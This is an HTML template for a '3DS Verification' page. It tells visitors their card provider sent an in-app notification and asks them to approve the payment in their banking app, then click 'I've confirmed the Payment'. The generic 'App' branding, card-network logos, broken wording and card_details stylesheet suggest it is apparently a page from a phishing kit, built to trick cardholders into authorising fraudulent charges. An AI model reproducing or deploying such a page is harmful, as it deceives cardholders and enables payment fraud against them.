<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>App</title>
    
    <link rel="icon" type="image/x-icon" href="/static/assets/imgs/favicon.ico">
    <link rel="stylesheet" href="/static/assets/custom_css/card_details.css">

<body>

    <div class="main">
        <div class="logo-bar">
            <img id="img" src="/static/assets/imgs/logo.png">
            <p> - 3DS Verification</p>

        </div>
        <hr class="h-line">

        <div class="inner">
            <form action="" method="post">
                {% csrf_token %}
            <h2>Your card provider have sent you a in-app 
                notification to confirm the payment, please 
                head over to your banking app and click 
                confirm. Once confirmed, please click on the 
                button below to authenticate the payment:</h2>
            <button class="btn" name = "Payment_by_App" type="submit">I've confirmed the Payment</button>
        </form>
        </div>
<div class="cards">
    <img src="/static/assets/imgs/m_c.png">
    <img src="/static/assets/imgs/v_c.jpg">
</div>
<footer>
    <div class="logo-bar">
        <img id="pwrby" src="/static/assets/imgs/pwrby.jpeg" alt="">
    </div>
</footer>
    </div>
